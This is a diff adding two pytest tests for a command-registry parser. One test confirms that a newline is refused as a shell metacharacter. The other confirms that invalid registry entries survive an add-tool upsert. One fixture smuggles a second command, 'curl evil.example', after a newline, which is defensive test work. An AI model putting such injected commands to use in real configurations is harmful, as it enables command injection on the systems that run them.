@@ -81,6 +81,24 @@ def test_metacharacter_commands_refused(tmp_path):
     assert any("required" in p for p in data["problems"])
 
 
+def test_newline_in_command_is_refused_as_a_metacharacter(tmp_path):
+    """C9 (2026-08 audit): _META_RE blocked `;` but not a bare newline, even though a
+    newline separates shell statements exactly the same way once anything downstream
+    actually runs the command through a real shell. A registry entry couldn't be built
+    with a literal `;` in it, but could with `\\n` achieving the identical effect - closed
+    by adding \\n/\\r to the same blocked set, not by narrowing the plain-argv contract."""
+    section = (
+        "```json\n"
+        + json.dumps(
+            {"analysers": [{"name": "sneaky", "command": "cxcli scan\ncurl evil.example"}]}
+        )
+        + "\n```"
+    )
+    valid, problems = ext.parse_registry(section)
+    assert valid == []
+    assert any("metacharacters" in p and "REFUSED" in p for p in problems)
+
+
 def test_sections_and_registry_parse(tmp_path):
     data = ext.load(_write(tmp_path))
     assert "CTRL-xxx" in data["sections"]["Standing instructions"]
@@ -259,6 +277,23 @@ def test_add_tool_preserves_other_sections(tmp_path):
     assert "CTRL-xxx" in data["sections"]["Standing instructions"]  # untouched
     assert "Jira" in data["sections"]["Close actions"]
     assert {e["name"] for e in data["registry"]} == {"acme-scan", "new"}
+
+
+def test_add_tool_preserves_pre_existing_invalid_entries_on_upsert(tmp_path):
+    """M7 (2026-08 Fable audit): `_cmd_add_tool` used to rebuild the registry from
+    `load(file)["registry"]` (parse_registry()'s VALID-only view), so any pre-existing
+    entry already flagged as a problem (bad shape, a refused shell-metacharacter command)
+    was silently dropped - not preserved, not reported - the instant add-tool touched the
+    file for something else entirely. It must survive, verbatim, in the raw JSON fence."""
+    f = tmp_path / "team-extensions.md"
+    f.write_text(_CONTRACT, encoding="utf-8")  # carries "evil" and "incomplete", both invalid
+    assert ext.main(["--file", str(f), "add-tool", "--name", "new", "--command", "newtool ."]) == 0
+    raw = json.loads(ext._JSON_FENCE_RE.search(f.read_text(encoding="utf-8")).group(1))
+    names = {e.get("name") for e in raw["analysers"]}
+    assert names == {"acme-scan", "evil", "incomplete", "new"}, (
+        "pre-existing invalid entries ('evil', 'incomplete') must not be silently dropped "
+        "from the raw registry by an unrelated add-tool upsert"
+    )
 
 
 def test_add_tool_refuses_metacharacters(tmp_path):
